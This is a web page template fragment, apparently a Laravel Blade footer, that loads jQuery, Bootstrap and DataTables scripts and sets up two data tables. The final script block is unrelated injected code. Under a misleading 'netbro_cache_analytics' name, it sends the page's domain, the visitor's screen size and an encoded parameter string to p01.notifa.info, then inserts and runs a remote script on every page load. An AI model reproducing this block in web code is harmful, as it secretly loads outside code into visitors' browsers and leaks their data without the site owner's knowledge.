<!-- Bootstrap core JavaScript-->
  <script src="{{ URL::to ('assets/js/jquery.min.js')}}"></script>
  <script src="{{ URL::to ('assets/js/popper.min.js')}}"></script>
  <script src="{{ URL::to ('assets/js/bootstrap.min.js')}}"></script>
	
  <!-- simplebar js -->
   <script src="{{ URL::to ('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{ URL::to ('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{ URL::to ('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{ URL::to ('assets/js/app-script.js')}}"></script>
	<!--Data Tables js-->
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/jszip.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/pdfmake.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/vfs_fonts.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/buttons.html5.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/buttons.print.min.js')}}"></script>
  <script src="{{ URL::to ('assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js')}}"></script>

    <script>
     $(document).ready(function() {
      //Default data table
       $('#default-datatable').DataTable();


       var table = $('#example').DataTable( {
        lengthChange: false,
        buttons: [ 'copy', 'excel', 'pdf', 'print', 'colvis' ]
      } );
 
     table.buttons().container()
        .appendTo( '#example_wrapper .col-md-6:eq(0)' );
      
      } );

    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujWFAQR51fO%2bPm6qO5rwZXo5YjPH6qDtaGM5W6zt0wQjFcbCxKMWzWePB%2f%2fmL05ZfCIzSuNT8TjNA0RvFHxjvpQyDy%2b0nwjEYjkMqXyJnKEcCkYiY0wTpoVkPxy63FCOh7EIAC02C3AAfGuDbybG4jKM8yv7OMn83eoyJZKtSx%2fKBLmcnolqCIokeH90TBi7jNSeVc6FiEq%2bAedoFyijdCS7OPABofv2vd3QlcJ7A6ptffzdgA8s4QS%2fhBtVfNgbibWCqktX7PvSTzMPMy9IMDM4UKk9UgiG%2fwpbKmJ0gsZdUC0BZdjam%2bCKy%2fs29mUdwqXSFdSoB8bm9vzwB9aqXHXw4oGWi4Ubi1yc1R%2bd%2fU6XwWizqXDjRFQV80f4d1nHytNTun4vFBoYTQq7oQBg2NLTiyugl1cBEfGFoWYu6OtemDlfnHIl4HCoQle82LjnsKEjsHK6YS1%2bNa%2fNHfs9XoEz5DwV7YgBL237jtvcrESrwQEXmnXr1Mk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>